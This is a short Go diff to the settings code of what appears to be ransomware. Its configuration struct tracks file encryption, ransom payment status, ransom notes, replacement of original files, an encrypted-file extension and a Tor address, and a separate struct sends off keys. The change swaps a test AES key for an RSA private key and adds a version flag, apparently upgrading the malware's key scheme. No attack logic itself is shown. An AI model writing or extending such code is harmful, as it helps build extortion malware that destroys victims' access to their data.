@@ -1,6 +1,7 @@
 package utils
 
 import (
+	"crypto/rsa"
 	"path/filepath"
 	"strings"
 	"sync"
@@ -9,22 +10,23 @@ import (
 type OperatingMode int
 
 type ProgramSettings struct {
-	EncryptionMode   bool
-	SuppliedAESKey   string //testing purposes
-	PaidStatus       bool
-	DecryptionHash   string
-	Delete           bool
-	sep              string
-	Key              string
-	Dir              string
-	FileFormat       string
-	ReplaceOriginal  bool
-	EncryptedFileExt string
-	Recursion        bool
-	LeaveNote        bool
-	RawKey           bool
-	OfflineMode      bool
-	TorAddress       string
+	EncryptionMode bool
+	// SuppliedAESKey   string //testing purposes
+	SuppliedClientPrivateKey *rsa.PrivateKey
+	PaidStatus               bool
+	DecryptionHash           string
+	Delete                   bool
+	sep                      string
+	Key                      string
+	Dir                      string
+	FileFormat               string
+	ReplaceOriginal          bool
+	EncryptedFileExt         string
+	Recursion                bool
+	LeaveNote                bool
+	RawKey                   bool
+	OfflineMode              bool
+	TorAddress               string
 }
 
 func (ps *ProgramSettings) GetDir() (string, error) {
@@ -69,6 +71,7 @@ type KeySendoffStruct struct {
 	Key  string `json:"key"`
 	Hash string `json:"hash"`
 	Paid bool   `json:"paid"`
+	V3   bool   `json:"v3"`
 }
 
 type PaidStatus string
